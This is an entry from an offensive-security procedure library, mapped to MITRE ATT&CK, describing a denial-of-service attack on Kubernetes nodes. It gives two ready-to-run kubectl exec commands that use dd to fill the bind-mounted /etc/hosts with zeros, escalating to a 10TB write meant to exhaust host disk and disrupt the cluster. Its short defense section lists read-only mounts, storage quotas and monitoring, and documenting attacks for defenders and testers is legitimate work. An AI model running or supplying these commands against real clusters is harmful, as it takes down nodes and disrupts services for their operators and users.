---
tags:
  - dos
  - disk-exhaustion
  - dd
type: procedure
tools:
  - '[[tools/dd]]'
  - '[[tools/kubectl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/dd-fill-etc-hosts]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:56.636Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: edff96bd-b1b2-4be0-8ce7-34cf65ce31f9
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Overwrite-Etc-Hosts-with-Dd

## Summary

This procedure uses the dd utility inside a Kubernetes pod to write large volumes of data to the bind-mounted /etc/hosts file, consuming host disk space and leading to DoS.

## Description

The /etc/hosts file is bind-mounted from the host without read-only flags or quotas, allowing pods to write unbounded data. dd copies zeros from /dev/zero to the file, scalable from 100MB to 10TB, directly impacting host storage at /var/lib/docker/overlay2/<hash>/etc-hosts.

## Requirements

1. Running pod with shell access
2. kubectl for remote execution
3. No pod resource limits on memory/disk

## Defense

Defensive measures and detection strategies:

- Set read-only mounts for /etc files in pod spec
- Enforce resource quotas (limits.requests for ephemeral-storage)
- Monitor disk I/O spikes and pod writes via Prometheus or host metrics

## Objectives

1. Exhaust host disk via pod writes
2. Trigger node unavailability
3. Disrupt cluster operations

## Instructions

### Step 1: Execute Small Write

**Context**: Test with moderate data to verify impact.

**Command** ([[commands/dd-fill-etc-hosts]]):
```bash
kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=100 bs=1M
```

> Writes 100MB; output: "100+0 records in\n100+0 records out".

### Step 2: Scale to Exhaustion

**Context**: Ramp up for full DoS.

**Command** ([[commands/dd-fill-etc-hosts-large]]):
```bash
kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M
```

> Attempts 10TB write until disk full.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[OS Exhaustion Flood]]

### Sub-Techniques


## Commands Used

- [[commands/dd-fill-etc-hosts]]

## Tools Used

- [[tools/dd]]

## Tags

- [[dos]]
- [[disk-exhaustion]]
